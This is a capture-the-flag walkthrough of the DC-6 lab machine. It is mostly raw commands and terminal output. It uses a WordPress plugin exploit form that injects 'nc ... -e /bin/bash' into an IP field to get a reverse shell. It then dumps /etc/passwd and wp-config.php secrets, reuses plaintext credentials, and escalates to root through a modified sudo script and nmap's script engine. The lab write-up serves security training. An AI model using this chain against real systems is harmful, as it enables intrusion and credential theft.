=> Download the exploit 45274.html:
<form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="ip" value="google.fr| nc 192.168.1.7 3592 -e /bin/bash" />

=> Run the file 45274.html on web browser => Submit Request
=>
root@Blue3:~# nc -nvlp 3592
listening on [any] 3592 ...
connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 57426
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-6:/var/www/html/wp-admin$ uname -a
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
www-data@dc-6:/var/www/html/wp-admin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash
mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash
sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash
jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash

#
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

www-data@dc-6:/var/www/html$ cat wp-config.php
...
define('WP_HOME','http://wordy');
define('WP_SITEURL','http://wordy');
define( 'DB_NAME', 'wordpressdb' );
/** MySQL database username */
define( 'DB_USER', 'wpdbuser' );
/** MySQL database password */
define( 'DB_PASSWORD', 'meErKatZ' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define('AUTH_KEY',         '])D+@FnrG?9!uY.Gzpq*mM|0)k!c/b((uva} TLj^qi3,&?zat (O`3:C|f{RcZ=');
define('SECURE_AUTH_KEY',  'p:bb&g[-Bl!c|7U3#q,<<4U-EDmyi19mwUCstRhuGl=Z3ic`Nxa2oS6o4_aS-bOb');
define('LOGGED_IN_KEY',    'tvhqz`qp5`ds-q_+XI*%PsA0?1ucRKRNn5gH|U(tO_1T>Z{#yd]1,)6LFu(]#6jw');
define('NONCE_KEY',        ')&@1c#y5 ]l&b5wzv2Gt:#HluwO4M.o{-1xj5X3@s|bKe[UG45q@-ApJ*I{?C0M(');
define('AUTH_SALT',        '$Hdo5n&{R7kSwT-2R^0OBr9|yGN-8Fvhbyz}X$9cv+Nbg7pdztt4`]K0@Wxd,m)]');
define('SECURE_AUTH_SALT', '/6|xh|P|(-3m~I|]WIo-)<;@PjL3(U(o|4O6nhgDU+KDA(!;V|r8_P|-up7GbC@i');
define('LOGGED_IN_SALT',   'p^|Rh5tREwFk%L)*^^-f8=[~F*XN_j}HYAB%8bmW5d43-eXxSd-$D Xw/q<@@G?w');
define('NONCE_SALT',       'K%u>~EtO%mLhYz|2;2<W+yjMITd=rj:En#X4AR]?`1Pg)3YHS+0zBl&_:?ji{NYh');

$table_prefix = 'wp_';
...

#
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

www-data@dc-6:/home/graham$ cd /home/mark/stuff
www-data@dc-6:/home/mark/stuff$ ls -ltra
total 12
-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt
drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .
drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..

www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement

www-data@dc-6:/home/mark/stuff$ cd /home/jens
www-data@dc-6:/home/jens$ ls -ltra
total 28
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .
drwxr-xr-x 6 root root 4096 Apr 26  2019 ..
www-data@dc-6:/home/jens$ cat backups.sh
cat backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html

=>
graham / GSo7isUM1D4
=>
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh

=> "Add Line number 3â€¦ /bin/bash means that it opens a shell.
To put it all into perspective, if we run /home/jens/backups.sh as the user jens, then it opens a shell and we will be user jens.

I decided to run the script as follows: sudo -u jens /home/jens/backups.sh"

graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ nano /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
/bin/bash

=>
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
tar: Removing leading `/' from member names
tar (child): backups.tar.gz: Cannot open: Permission denied
tar (child): Error is not recoverable: exiting now
tar: backups.tar.gz: Wrote only 4096 of 10240 bytes
tar: Child returned status 2
tar: Error is not recoverable: exiting now
jens@dc-6:/home/graham$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)

DONE.

#
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
 ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

jens@dc-6:/home/graham$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

=> jens can run nmap as ROOT !
=> https://gtfobins.eblue3.com/gtfobins/nmap/#sudo
jens@dc-6:/home/graham$ TF=$(mktemp)
jens@dc-6:/home/graham$ echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:/home/graham$ sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-13 02:33 AEST
NSE: Warning: Loading '/tmp/tmp.pfZxEGwKMz' -- the recommended file extension is '.nse'.
# root
# /root
# total 32
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
drwxr-xr-x 22 root root 4096 Apr 24  2019 ..
-rw-------  1 root root  438 Apr 24  2019 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 26  2019 .nano
-rw-r--r--  1 root root  541 Apr 26  2019 theflag.txt
-rw-------  1 root root   16 Apr 26  2019 .bash_history
drwx------  3 root root 4096 Apr 26  2019 .
#

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"'
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8)


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
